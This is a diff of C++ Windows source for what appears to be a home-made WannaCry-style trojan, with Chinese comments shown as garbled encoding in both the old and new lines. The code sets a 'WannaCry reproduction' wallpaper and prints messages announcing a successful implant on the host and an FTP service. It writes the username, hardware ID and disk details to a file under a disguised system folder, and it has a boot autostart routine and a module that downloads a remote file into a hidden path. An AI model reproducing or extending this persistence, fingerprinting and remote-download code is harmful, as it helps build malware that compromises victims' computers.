@@ -7,29 +7,29 @@ ifstream ifs;
 string wstring2string(wstring wstr)
 {
     string result;
-    //»ñÈ¡»º³åÇø´óĞ¡£¬²¢ÉêÇë¿Õ¼ä£¬»º³åÇø´óĞ¡ÊÂ°´×Ö½Ú¼ÆËãµÄ  
+    //è·å–ç¼“å†²åŒºå¤§å°ï¼Œå¹¶ç”³è¯·ç©ºé—´ï¼Œç¼“å†²åŒºå¤§å°äº‹æŒ‰å­—èŠ‚è®¡ç®—çš„  
     int len = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), NULL, 0, NULL, NULL);
     char* buffer = new char[len + 1];
-    //¿í×Ö½Ú±àÂë×ª»»³É¶à×Ö½Ú±àÂë  
+    //å®½å­—èŠ‚ç¼–ç è½¬æ¢æˆå¤šå­—èŠ‚ç¼–ç   
     WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), buffer, len, NULL, NULL);
     buffer[len] = '\0';
-    //É¾³ı»º³åÇø²¢·µ»ØÖµ  
+    //åˆ é™¤ç¼“å†²åŒºå¹¶è¿”å›å€¼  
     result.append(buffer);
     delete[] buffer;
     return result;
 }
 
 
-//¸ü¸ÄÏµÍ³×ÀÃæ
+//æ›´æ”¹ç³»ç»Ÿæ¡Œé¢
 void system_information_table() {
-    const char* path = "C:\\Users\\ASUS\\Pictures\\CG\\WannaCry¸´ÏÖ.jpg";
+    const char* path = "C:\\Users\\ASUS\\Pictures\\CG\\WannaCryå¤ç°.jpg";
     SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path, SPIF_SENDCHANGE);
 }
 
 
 string text_box_auto() {
-    string email_text_book = "³É¹¦Ö²ÈëËŞÖ÷»ú";
-    string email_text_neirong = "FTP¿ÉËæÊ±¿ªÆô·şÎñ£¡";
+    string email_text_book = "æˆåŠŸæ¤å…¥å®¿ä¸»æœº";
+    string email_text_neirong = "FTPå¯éšæ—¶å¼€å¯æœåŠ¡ï¼";
     return email_text_book+email_text_neirong;
 }
 
@@ -44,16 +44,16 @@ string text_box_auto() {
 
 void fstream_double() {
 	ofs.open("C:\\Windows sys\\computer_box.txt", ios::out);
-	ofs << "¼ÆËã»úÓÃ»§Ãû³Æ:" <<windows_username<< endl;
-    ofs << "Éè±¸HWID:" << HWID << endl;
-    ofs << "´ÅÅÌÃû³Æ:" <<system_box <<endl;
-    ofs << "ÎÄ¼şÏµÍ³£º" <<system_text<< endl;
+	ofs << "è®¡ç®—æœºç”¨æˆ·åç§°:" <<windows_username<< endl;
+    ofs << "è®¾å¤‡HWID:" << HWID << endl;
+    ofs << "ç£ç›˜åç§°:" <<system_box <<endl;
+    ofs << "æ–‡ä»¶ç³»ç»Ÿï¼š" <<system_text<< endl;
 }
 
 
-//¿ª»ú×ÔÆô¶¯
+//å¼€æœºè‡ªå¯åŠ¨
 string userlc;
-//¿ª»ú×ÔÆô¶¯
+//å¼€æœºè‡ªå¯åŠ¨
 void AutoStart()
 {
     
@@ -91,7 +91,7 @@ void ifsteam_open_read() {
     ifs.open("C:\\Windows sys\\computer_box.txt", ios::in);
     if (!ifs.is_open())
     {
-        cout << "ÎÄ¼ş´ò¿ªÊ§°Ü" << endl;
+        cout << "æ–‡ä»¶æ‰“å¼€å¤±è´¥" << endl;
         return;
     }
     char c;
@@ -102,7 +102,7 @@ void ifsteam_open_read() {
     ifs.close();
 }
 
-//GetVolumelnformationÈ«¾Ö²ÎÊı
+//GetVolumelnformationå…¨å±€å‚æ•°
 
 
 
@@ -114,13 +114,13 @@ void c_box_information() {
     DWORD dwfilesystemflgs = 0;
     TCHAR szfilesystemname[260] = { 0 };
     GetVolumeInformation(_T("C:\\"), szvolumename, 260, &dwvolumeserialnumber, &dwmaxvolumename, &dwfilesystemflgs, szfilesystemname, 260);
-    //printf("¾í±êÃû³Æ£º%s\n¾í±êĞòÁĞºÅ£º%x\nÎÄ¼şÃû³Æ×î´ó³¤¶È£º%d\nÎÄ¼şÏµÍ³±êÊ¶£º%x\nÎÄ¼şÏµÍ³Ãû³Æ:%s",
+    //printf("å·æ ‡åç§°ï¼š%s\nå·æ ‡åºåˆ—å·ï¼š%x\næ–‡ä»¶åç§°æœ€å¤§é•¿åº¦ï¼š%d\næ–‡ä»¶ç³»ç»Ÿæ ‡è¯†ï¼š%x\næ–‡ä»¶ç³»ç»Ÿåç§°:%s",
     //    szvolumename, dwvolumeserialnumber, dwmaxvolumename, dwfilesystemflgs, szfilesystemname);
-    cout << "¾í±êÃû³Æ£º"<< szvolumename <<endl;
-    cout << "¾í±êĞòÁĞºÅ£º" << dwvolumeserialnumber << endl;
-    cout << "ÎÄ¼şÃû³Æ×î´ó³¤¶È£º" << dwmaxvolumename << endl;
-    cout << "ÎÄ¼şÏµÍ³±êÊ¶£º" << dwfilesystemflgs << endl;
-    cout << "ÎÄ¼şÏµÍ³Ãû³Æ" << szfilesystemname << endl;
+    cout << "å·æ ‡åç§°ï¼š"<< szvolumename <<endl;
+    cout << "å·æ ‡åºåˆ—å·ï¼š" << dwvolumeserialnumber << endl;
+    cout << "æ–‡ä»¶åç§°æœ€å¤§é•¿åº¦ï¼š" << dwmaxvolumename << endl;
+    cout << "æ–‡ä»¶ç³»ç»Ÿæ ‡è¯†ï¼š" << dwfilesystemflgs << endl;
+    cout << "æ–‡ä»¶ç³»ç»Ÿåç§°" << szfilesystemname << endl;
 
    /* TCHAR VolumeNameBuffer[MAX_PATH + 1], FileSystemNameBuffer[MAX_PATH];
     DWORD VolumeSerialNumber, MaximumComponentLength, FileSystemFlags;
@@ -176,25 +176,45 @@ string system_information_text() {
 
 
 
-//ÏÂÔØÄ£¿é
+//ä¸‹è½½æ¨¡å—
 void download(string usl) {
     string download_usl = usl;
-    size_t len = download_usl.length();//»ñÈ¡×Ö·û´®³¤¶È
+    size_t len = download_usl.length();//è·å–å­—ç¬¦ä¸²é•¿åº¦
     int nmlen = MultiByteToWideChar(CP_ACP, 0, download_usl.c_str(), len + 1, NULL, 0);
     wchar_t* buffer = new wchar_t[nmlen];
     MultiByteToWideChar(CP_ACP, 0, download_usl.c_str(), len + 1, buffer, nmlen);
-    HRESULT hr = URLDownloadToFile(NULL, buffer, _T("F:\\$windows_sys\\»ÒÔ­°§.jpg"), 0, NULL);
+    HRESULT hr = URLDownloadToFile(NULL, buffer, _T("F:\\$windows_sys\\ç°åŸå“€.jpg"), 0, NULL);
     if (hr == S_OK)
     {
         setcolor(2);
-        cout << "ÎÄ¼şÏÂÔØ³É¹¦£¡" << endl;
+        cout << "æ–‡ä»¶ä¸‹è½½æˆåŠŸï¼" << endl;
         setcolor(15);
     }
     else
     {
         setcolor(12);
-        cout << "ÎÄ¼şÏÂÔØÊ§°Ü£¡" << endl;
+        cout << "æ–‡ä»¶ä¸‹è½½å¤±è´¥ï¼" << endl;
         setcolor(15);
     }
    
+}
+
+//æ—¥å¿—æ¨¡å—
+int log() {
+    //åˆ›å»ºæ—¥å¿—å¯¹è±¡log1ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨åˆ™è¿½åŠ ï¼Œæ—¥å¿—è¾“å‡ºä¸‹é™çº§åˆ«ä¸ºINFOçº§åˆ«
+    YLog log1(YLog::INFO, "log1.txt", YLog::ADD);
+    //åˆ›å»ºæ—¥å¿—å¯¹è±¡log2ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨åˆ™è¦†ç›–ï¼Œæ—¥å¿—è¾“å‡ºä¸‹é™çº§åˆ«ä¸ºERRORçº§åˆ«
+    YLog log2(YLog::ERR, "log2.txt", YLog::OVER);
+    int a = 520;
+    double b = 13.14;
+    std::string c = "I love U.";
+
+    log1.W(__FILE__, __LINE__, YLog::INFO, "watch_a", a);//INFOçº§åˆ«ä¸ä½äºlog1çš„ä¸‹é™INFOçº§åˆ«ï¼Œæ­£å¸¸å†™å…¥æ—¥å¿—æ–‡ä»¶
+    log1.W(__FILE__, __LINE__, YLog::ERR, "see_b", b);//æ­£å¸¸å†™å…¥
+    log1.W(__FILE__, __LINE__, YLog::INFO, "log_c", c);//æ­£å¸¸å†™å…¥
+
+    log2.W(__FILE__, __LINE__, YLog::INFO, "A", a);//INFOçº§åˆ«ä½äºlog2çš„ä¸‹é™ERRORçº§åˆ«ï¼Œä¸å†™å…¥æ—¥å¿—
+    log2.W(__FILE__, __LINE__, YLog::ERR, "B", b);//æ­£å¸¸å†™å…¥
+    log2.W(__FILE__, __LINE__, YLog::INFO, "C", c);//ä¸å†™å…¥æ—¥å¿—
+    return 0;
 }
